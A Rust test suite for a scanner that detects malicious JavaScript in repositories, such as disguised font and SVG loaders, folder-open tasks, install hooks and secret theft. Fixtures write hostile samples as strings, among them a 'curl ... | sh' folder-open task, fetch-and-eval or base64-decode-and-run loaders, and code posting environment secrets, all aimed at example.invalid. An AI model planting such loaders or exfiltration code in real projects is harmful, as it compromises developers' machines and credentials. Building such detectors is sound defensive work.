use serde_json::Value;
use std::{
    fs,
    path::PathBuf,
    process::Command,
    time::{SystemTime, UNIX_EPOCH},
};

#[test]
fn json_scan_completes_without_findings() {
    let root = temporary_directory("clean");
    fs::write(root.join("main.js"), b"export const answer = 42;\n").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format", "json"]);

    assert_eq!(output.status.code(), Some(0));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "complete");
    assert_eq!(report["network_access"], "disabled");
    assert_eq!(report["summary"]["files"], 1);
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn policy_finding_returns_one() {
    let root = temporary_directory("finding");
    fs::create_dir(root.join(".vscode")).unwrap();
    fs::write(
        root.join(".vscode/tasks.json"),
        br#"{"tasks":[{"label":"run","command":"curl https://example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["risk"]["severity"], "critical");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn disguised_javascript_is_reported_and_bad_source_is_incomplete() {
    let root = temporary_directory("javascript");
    fs::write(
        root.join("fake.woff2"),
        b"module.exports = require('child_process');",
    )
    .unwrap();
    fs::write(root.join("broken.ts"), b"const = ;").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(2));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "incomplete");
    assert_eq!(report["files"][1]["parsed_language"], "javascript");
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["id"] == "FILE-PARSEABLE-JAVASCRIPT" && finding["file"] == "fake.woff2"
            })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn build_config_import_elevates_fake_asset_with_process_execution() {
    let root = temporary_directory("reachable-asset");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./fake.svg'); module.exports = {};",
    )
    .unwrap();
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    assert_eq!(finding["file"], "fake.svg");
    assert!(
        finding["evidence"]
            .to_string()
            .contains("tailwind.config.js")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn imported_svg_script_reaches_remote_execution() {
    let root = temporary_directory("svg-script-chain");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./payload.svg');",
    )
    .unwrap();
    fs::write(
        root.join("payload.svg"),
        b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>const payload = fetch('https://example.invalid/control'); eval(payload);</script></svg>",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                    && finding["file"] == "payload.svg"
                    && finding["evidence"]
                        .to_string()
                        .contains("tailwind.config.js")
            })
    );
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE"
                    && finding["file"] == "payload.svg"
                    && finding["severity"] == "critical"
            })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reconstructed_polinrider_woff2_trait_is_elevated_by_build_config() {
    let root = temporary_directory("woff-loader");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./fonts/icon.woff2');",
    )
    .unwrap();
    fs::create_dir(root.join("fonts")).unwrap();
    fs::write(
        root.join("fonts/icon.woff2"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE"
                && finding["severity"] == "critical"
                && finding["file"] == "fonts/icon.woff2")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reconstructed_polinrider_chain_links_folder_open_woff2_and_remote_execution() {
    let root = temporary_directory("polinrider-chain");
    fs::create_dir(root.join(".vscode")).unwrap();
    fs::write(root.join(".vscode/tasks.json"), br#"{"tasks":[{"label":"warmup","command":"node boot.js","runOptions":{"runOn":"folderOpen"}}]}"#).unwrap();
    fs::write(root.join("boot.js"), b"require('./icon.woff2');").unwrap();
    fs::write(root.join("icon.woff2"), b"async function run() { const response = await fetch('https://example.invalid/control'); const source = Buffer.from(await response.text(), 'base64').toString(); Function(source)(); } run();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE"
                && finding["severity"] == "critical")
    );
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("folderOpen")
                && finding["evidence"].to_string().contains("decode"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reconstructed_folder_open_trait_links_task_to_script() {
    let root = temporary_directory("folder-open-script");
    fs::create_dir(root.join(".vscode")).unwrap();
    fs::write(root.join(".vscode/tasks.json"), br#"{"tasks":[{"label":"boot","type":"shell","command":"node boot.js","runOptions":{"runOn":"folderOpen"}}]}"#).unwrap();
    fs::write(
        root.join("boot.js"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-PROCESS-EXECUTION"
                && finding["evidence"].to_string().contains("folderOpen"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reconstructed_interview_start_trait_reaches_hidden_import() {
    let root = temporary_directory("start-hidden-import");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node index.js"}}"#,
    )
    .unwrap();
    fs::write(
        root.join("index.js"),
        b"require('./lib/config.js'); console.log('ready');",
    )
    .unwrap();
    fs::create_dir(root.join("lib")).unwrap();
    fs::write(root.join("lib/config.js"), b"async function boot() { const r = await fetch('https://example.invalid/control'); eval(await r.text()); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("npm start"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn npm_lifecycle_script_is_an_execution_root() {
    let root = temporary_directory("lifecycle-root");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"postinstall":"node setup.js"}}"#,
    )
    .unwrap();
    fs::write(
        root.join("setup.js"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-PROCESS-EXECUTION"
                && finding["evidence"].to_string().contains("npm postinstall"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn devcontainer_hook_reaches_local_script() {
    let root = temporary_directory("devcontainer-root");
    fs::create_dir(root.join(".devcontainer")).unwrap();
    fs::write(
        root.join(".devcontainer/devcontainer.json"),
        br#"{"postCreateCommand":"node setup.js"}"#,
    )
    .unwrap();
    fs::write(
        root.join("setup.js"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-PROCESS-EXECUTION"
                && finding["evidence"]
                    .to_string()
                    .contains("postCreateCommand"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn compound_npm_vscode_argument_and_gitlab_roots_reach_scripts() {
    let root = temporary_directory("execution-roots");
    fs::create_dir_all(root.join(".vscode")).unwrap();
    fs::create_dir_all(root.join("scripts")).unwrap();
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"npm run prepare && node ./scripts/npm.js","prepare":"node ./scripts/prepare.js"}}"#,
    )
    .unwrap();
    fs::write(
        root.join(".vscode/tasks.json"),
        br#"{"tasks":[{"type":"process","command":"node","args":["./scripts/vscode.js"],"runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();
    fs::write(
        root.join(".gitlab-ci.yml"),
        b"job:\n  script:\n    - node scripts/ci.js\n",
    )
    .unwrap();
    fs::write(root.join("scripts/prepare.js"), b"console.log('prepare');").unwrap();
    for file in ["npm.js", "vscode.js", "ci.js"] {
        fs::write(
            root.join("scripts").join(file),
            b"async function boot() { const response = await fetch('https://example.invalid/x'); eval(await response.text()); } boot();",
        )
        .unwrap();
    }

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let routes = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
        .map(|finding| finding["evidence"].to_string())
        .collect::<Vec<_>>();
    assert!(routes.iter().any(|route| route.contains("npm start")));
    assert!(routes.iter().any(|route| route.contains("folderOpen")));
    assert!(routes.iter().any(|route| route.contains(".gitlab-ci.yml")));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn benign_minified_bundle_does_not_become_critical() {
    let root = temporary_directory("minified-benign");
    let source = format!(
        "const values=[{}]; console.log(values.length);",
        "1,".repeat(50_000)
    );
    fs::write(root.join("bundle.js"), source).unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["severity"] != "critical")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn representative_benign_js_patterns_have_no_critical_findings() {
    type Case<'a> = (&'a str, &'a [(&'a str, &'a [u8])]);
    let cases: &[Case<'_>] = &[
        ("vite", &[("vite.config.js", b"import { defineConfig } from 'vite'; export default defineConfig({ build: { outDir: 'dist' } });")]),
        ("webpack", &[("webpack.config.js", b"const cp = require('child_process'); const revision = cp.execSync('git rev-parse HEAD'); module.exports = { mode: 'production' };")]),
        ("electron", &[("main.js", b"const { clipboard } = require('electron'); console.log(clipboard.readText());")]),
        ("next", &[("next.config.js", b"fetch('/telemetry', { method: 'POST', body: process.env.NODE_ENV }); module.exports = {};")]),
        ("lifecycle", &[("package.json", br#"{"scripts":{"postinstall":"node setup.js"}}"#), ("setup.js", b"console.log('ready');")]),
    ];
    for (label, files) in cases {
        let root = temporary_directory(label);
        for (path, bytes) in *files {
            fs::write(root.join(path), bytes).unwrap();
        }
        let output = run(&[root.to_str().unwrap(), "--format=json"]);
        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
        assert!(
            report["findings"]
                .as_array()
                .unwrap()
                .iter()
                .all(|finding| finding["severity"] != "critical"),
            "{label}"
        );
        fs::remove_dir_all(root).unwrap();
    }
}

#[test]
fn statically_dead_branch_does_not_create_a_remote_execution_chain() {
    let root = temporary_directory("dead-branch");
    fs::write(root.join("main.js"), b"if (false) { eval(await fetch('https://example.invalid/x')); } if (true) { console.log('ready'); }").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn dynamic_module_target_is_explicitly_unresolved() {
    let root = temporary_directory("dynamic-module");
    fs::write(
        root.join("main.js"),
        b"const name = process.argv[2]; require(name); import(name);",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["unresolved_edges"]
            .as_array()
            .unwrap()
            .iter()
            .any(|edge| edge
                .as_str()
                .unwrap()
                .contains("dynamic module target unresolved"))
    );
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-DYNAMIC-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn unimported_fake_asset_is_not_elevated() {
    let root = temporary_directory("unreachable-asset");
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| { finding["id"] != "JS-REACHABLE-DISGUISED-SOURCE" })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn flow_analysis_ignores_modules_outside_known_execution_roots() {
    let root = temporary_directory("unreachable-flow");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node entry.js"}}"#,
    )
    .unwrap();
    fs::write(root.join("entry.js"), b"console.log('started');").unwrap();
    fs::write(
        root.join("unused.js"),
        b"const response = fetch('https://example.invalid/control'); eval(response);",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn uncalled_function_in_imported_asset_is_not_critical() {
    let root = temporary_directory("uncalled-function");
    fs::write(root.join("tailwind.config.js"), b"require('./fake.svg');").unwrap();
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); function later() { cp.exec('id'); }",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "high");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn disguised_asset_with_only_nonsecret_environment_flag_stays_high() {
    let root = temporary_directory("asset-env-flag");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./feature.svg');",
    )
    .unwrap();
    fs::write(
        root.join("feature.svg"),
        b"const mode = process.env.NODE_ENV; console.log(mode);",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "high");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn disguised_asset_with_computed_secret_access_is_critical() {
    let root = temporary_directory("asset-computed-secret");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./feature.svg');",
    )
    .unwrap();
    fs::write(
        root.join("feature.svg"),
        b"const token = process.env['TOKEN']; console.log(token);",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn cross_file_response_decode_reaches_computed_function() {
    let root = temporary_directory("cross-file-flow");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node startup.js"}}"#,
    )
    .unwrap();
    fs::write(root.join("api.js"), b"import axios from 'axios'; export async function config() { return (await axios.get('https://example.invalid/x')).data; }").unwrap();
    fs::write(
        root.join("utils.js"),
        b"export function unpack(x) { return Buffer.from(x, 'base64').toString(); }",
    )
    .unwrap();
    fs::write(root.join("startup.js"), b"import { config } from './api.js'; import { unpack } from './utils.js'; const data = unpack(await config()); global['Fun' + 'ction'](data)();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    let evidence = finding["evidence"].to_string();
    assert!(evidence.contains("npm start"));
    assert!(evidence.contains("axios.get"));
    assert!(evidence.contains("config"));
    assert!(evidence.contains("unpack"));
    assert!(evidence.contains("decode"));
    assert!(evidence.contains("Function"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn optional_chained_response_properties_reach_dynamic_execution() {
    let root = temporary_directory("optional-response-flow");
    fs::write(
        root.join("main.ts"),
        b"async function start() { const response = await fetch('https://example.invalid/control'); eval(await response?.text?.()); }\nasync function startComputed() { const response = await fetch('https://example.invalid/control'); const code = await response?.['text']?.(); Function(code)(); }\nstart(); startComputed();",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
            .count(),
        2
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn html_inline_and_external_scripts_enter_the_execution_graph() {
    let root = temporary_directory("html-scripts");
    fs::write(
        root.join("index.html"),
        b"<!doctype html>\n<script type=\"module\">\nconst payload = fetch('https://example.invalid/control');\neval(payload);\n</script>\n<script src=\"./external.js\"></script>",
    )
    .unwrap();
    fs::write(
        root.join("external.js"),
        b"const payload = fetch('https://example.invalid/control'); eval(payload);",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let chains: Vec<_> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
        .collect();
    assert_eq!(chains.len(), 2);
    for chain in &chains {
        assert_eq!(chain["severity"], "critical");
    }
    assert!(chains.iter().any(|chain| {
        chain["file"] == "index.html"
            && chain["line"] == 4
            && chain["evidence"]
                .to_string()
                .contains("inline script in HTML")
    }));
    assert!(chains.iter().any(|chain| {
        chain["file"] == "external.js"
            && chain["evidence"].to_string().contains("index.html")
            && chain["evidence"]
                .to_string()
                .contains("inline script in HTML")
    }));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reachable_vue_typescript_is_traced_but_markdown_examples_are_not() {
    let root = temporary_directory("vue-markdown-scripts");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node main.js"}}"#,
    )
    .unwrap();
    fs::write(root.join("main.js"), b"import './App.vue';").unwrap();
    fs::write(
        root.join("App.vue"),
        b"<template />\n<script>const helper = 1;</script>\n<script setup lang=\"ts\">\nconst payload: string = fetch('https://example.invalid/control');\neval(payload);\n</script>",
    )
    .unwrap();
    fs::write(
        root.join("README.md"),
        b"```html\n<script>const payload = fetch('https://example.invalid/example'); eval(payload);</script>\n```\n",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let chains: Vec<_> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
        .collect();
    assert_eq!(chains.len(), 1);
    assert_eq!(chains[0]["file"], "App.vue");
    assert_eq!(chains[0]["line"], 5);
    assert!(chains[0]["evidence"].to_string().contains("npm start"));
    assert_eq!(report["status"], "complete");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn embedded_script_parse_and_count_limits_make_the_scan_incomplete() {
    let malformed_root = temporary_directory("malformed-embedded-script");
    fs::write(
        malformed_root.join("index.html"),
        b"<script>const = ;</script>",
    )
    .unwrap();

    let output = run(&[malformed_root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(2));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "incomplete");
    assert!(
        report["incomplete_reasons"]
            .to_string()
            .contains("index.html")
    );
    fs::remove_dir_all(malformed_root).unwrap();

    let limited_root = temporary_directory("embedded-script-limit");
    let scripts = "<script>const value = 1;</script>".repeat(257);
    fs::write(limited_root.join("index.html"), scripts).unwrap();

    let output = run(&[limited_root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(2));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "incomplete");
    assert!(
        report["incomplete_reasons"]
            .to_string()
            .contains("embedded script limit")
    );
    fs::remove_dir_all(limited_root).unwrap();
}

#[test]
fn remote_data_survives_a_simple_character_xor_decoder() {
    let root = temporary_directory("xor-decoder");
    fs::write(
        root.join("main.js"),
        b"async function boot() { const response = await Promise.resolve(fetch('https://example.invalid/x')); const source = (await response.text()).split('').map(ch => String.fromCharCode(ch.charCodeAt(0) ^ 23)).join(''); Function(source)(); } boot();",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("decode"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn taint_survives_iterable_remote_responses_and_dynamic_environment_keys() {
    let root = temporary_directory("loop-taint");
    fs::write(
        root.join("main.js"),
        b"async function boot() { const response = await fetch('https://example.invalid/control'); for (const line of (await response.text()).split('\\n')) { eval(line); } } boot();\nconst key = 'TOKEN'; fetch('https://example.invalid/collect', { method: 'POST', body: process.env[key] });\nfor (const [name, value] of Object.entries(process.env)) { fetch('https://example.invalid/env', { body: value }); }\nfetch('https://example.invalid/names', { body: Object.keys(process.env) });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = report["findings"].as_array().unwrap();
    assert!(
        findings
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
    );
    assert!(findings.iter().any(|finding| {
        finding["id"] == "JS-SECRET-EXFILTRATION"
            && finding["evidence"].to_string().contains("process.env")
    }));
    assert_eq!(
        findings
            .iter()
            .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
            .count(),
        2,
        "environment variable names alone are not secret values"
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn taint_reaches_sinks_inside_classic_for_and_switch_branches() {
    let root = temporary_directory("loop-switch-taint");
    fs::write(
        root.join("main.js"),
        b"for (let payload = fetch('https://example.invalid/for'); payload; payload = null) {\n  eval(payload);\n}\nconst second = fetch('https://example.invalid/switch');\nswitch (process.platform) {\n  case 'win32': Function(second)(); break;\n  default: break;\n}",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
            .count()
            >= 2
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn commonjs_wrapper_preserves_remote_data_across_files() {
    let root = temporary_directory("commonjs-wrapper");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node main.js"}}"#,
    )
    .unwrap();
    fs::write(root.join("decode.js"), b"function unpack(x) { return Buffer.from(x, 'base64').toString(); } module.exports = { unpack };").unwrap();
    fs::write(root.join("main.js"), b"const helper = require('./decode.js'); async function boot() { const response = await fetch('https://example.invalid/x'); Function(helper.unpack(await response.text()))(); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("decode.js"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn private_commonjs_helper_is_not_treated_as_exported() {
    let root = temporary_directory("private-helper");
    fs::write(
        root.join("decode.js"),
        b"function unpack(x) { return x; } module.exports = {};",
    )
    .unwrap();
    fs::write(root.join("main.js"), b"const helper = require('./decode.js'); async function boot() { const response = await fetch('https://example.invalid/x'); Function(helper.unpack(await response.text()))(); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn esm_export_alias_is_traced_but_private_helper_is_not() {
    let root = temporary_directory("esm-exports");
    fs::write(root.join("decode.js"), b"function unpack(x) { return Buffer.from(x, 'base64').toString(); } function privateHelper(x) { return x; } export { unpack as decode };").unwrap();
    fs::write(root.join("main.js"), b"import { decode, privateHelper } from './decode.js'; async function boot() { const response = await fetch('https://example.invalid/x');\nFunction(decode(await response.text()))();\nFunction(privateHelper(await response.text()))(); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let chains: Vec<_> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
        .collect();
    assert_eq!(chains.len(), 1);
    assert!(chains[0]["evidence"].to_string().contains("decode.js"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn esm_reexport_preserves_remote_data_across_modules() {
    let root = temporary_directory("esm-reexport");
    fs::write(
        root.join("api.js"),
        b"export function unpack(x) { return Buffer.from(x, 'base64').toString(); }",
    )
    .unwrap();
    fs::write(
        root.join("bridge.js"),
        b"export { unpack as decode } from './api.js';",
    )
    .unwrap();
    fs::write(root.join("main.js"), b"import { decode } from './bridge.js'; async function boot() { const response = await fetch('https://example.invalid/x'); Function(decode(await response.text()))(); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("api.js"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn default_exported_function_preserves_remote_data() {
    let root = temporary_directory("default-export");
    fs::write(
        root.join("decode.js"),
        b"export default function unpack(x) { return Buffer.from(x, 'base64').toString(); }",
    )
    .unwrap();
    fs::write(root.join("main.js"), b"import unpack from './decode.js'; async function boot() { const response = await fetch('https://example.invalid/x'); Function(unpack(await response.text()))(); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn esm_star_reexport_preserves_remote_data_through_function_expression() {
    let root = temporary_directory("esm-star-reexport");
    fs::write(
        root.join("api.js"),
        b"export const unpack = function(x) { return Buffer.from(x, 'base64').toString(); };",
    )
    .unwrap();
    fs::write(root.join("bridge.js"), b"export * from './api.js';").unwrap();
    fs::write(root.join("main.js"), b"import { unpack } from './bridge.js'; async function boot() { const response = await fetch('https://example.invalid/x'); Function(unpack(await response.text()))(); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("api.js"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn commonjs_member_and_default_exports_preserve_remote_data() {
    let root = temporary_directory("commonjs-exports");
    fs::write(
        root.join("named.js"),
        b"function unpack(x) { return Buffer.from(x, 'base64').toString(); } exports.unpack = unpack;",
    )
    .unwrap();
    fs::write(
        root.join("default.js"),
        b"module.exports = function unpack(x) { return Buffer.from(x, 'base64').toString(); };",
    )
    .unwrap();
